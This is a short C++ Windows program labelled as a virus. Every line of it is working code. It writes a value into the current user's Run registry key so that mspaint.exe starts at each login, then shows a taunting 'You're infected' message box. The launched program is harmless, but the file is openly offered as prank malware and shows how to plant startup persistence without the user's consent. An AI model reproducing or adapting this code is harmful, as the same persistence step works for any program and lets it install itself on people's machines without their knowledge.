#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
using namespace std;

//VIRUS

int main()
{
	HKEY RunKey;
	LPCTSTR valueP = TEXT("MSPaint");	//Name of registry created
	LPCTSTR data = TEXT ("C:\\WINDOWS\\system32\\mspaint.exe"); //value set in the new registry

	if (RegOpenKey(HKEY_CURRENT_USER,
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RUN"), &RunKey) != ERROR_SUCCESS) //if system is unable to open location
	{
		cout << "Unable to open registry key. Exit.\n"; //display this message to the user
		return 0;
	}

	if (RegSetValueEx(RunKey, valueP, 0, REG_SZ, (LPBYTE)data, lstrlen(data) * sizeof(TCHAR)) != ERROR_SUCCESS)
	{	//If using registry set value, with values above, if unable to set value, close key and display message to the user
		RegCloseKey(RunKey);
		cout << "Unable to set the registry value. Exit\n";
		return 0;
	}
	else
	{
		RegCloseKey(RunKey);	//If successful display using a message box a custom message to the user
		cout << "Registry value is successfully set!\n";
		MessageBox(NULL, L"You're infected :-) I dare you to restart your machine!", L"Infection", MB_OKCANCEL);
	}
	return 0;
}
